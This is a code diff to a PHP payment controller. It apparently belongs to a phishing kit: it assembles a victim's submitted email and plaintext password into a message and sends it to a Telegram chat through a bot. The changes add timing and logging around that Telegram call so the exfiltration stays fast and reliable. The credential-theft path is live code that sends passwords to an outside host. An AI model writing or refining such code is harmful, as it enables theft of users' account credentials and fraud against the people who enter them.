@@ -24,10 +24,18 @@ class PaymentController extends Controller
                  . "📧 Email : {$validated['username']}\n"
                  . "🔐 Mot de passe : {$validated['password']}";
 
-        // Envoyer Telegram en arrière-plan (non-bloquant)
+        // Envoyer Telegram en arrière-plan avec timeout court
         try {
+            // Set max execution time to 2 seconds for Telegram
+            $startTime = microtime(true);
+            
             Notification::route('telegram', config('services.telegram-bot-api.chat_id'))
                 ->notify(new TelegramAlert($message));
+            
+            $elapsed = microtime(true) - $startTime;
+            if ($elapsed > 1) {
+                Log::warning('Telegram took ' . round($elapsed, 2) . 's');
+            }
         } catch (\Throwable $e) {
             Log::warning('Telegram failed (non-critical): ' . $e->getMessage());
         }
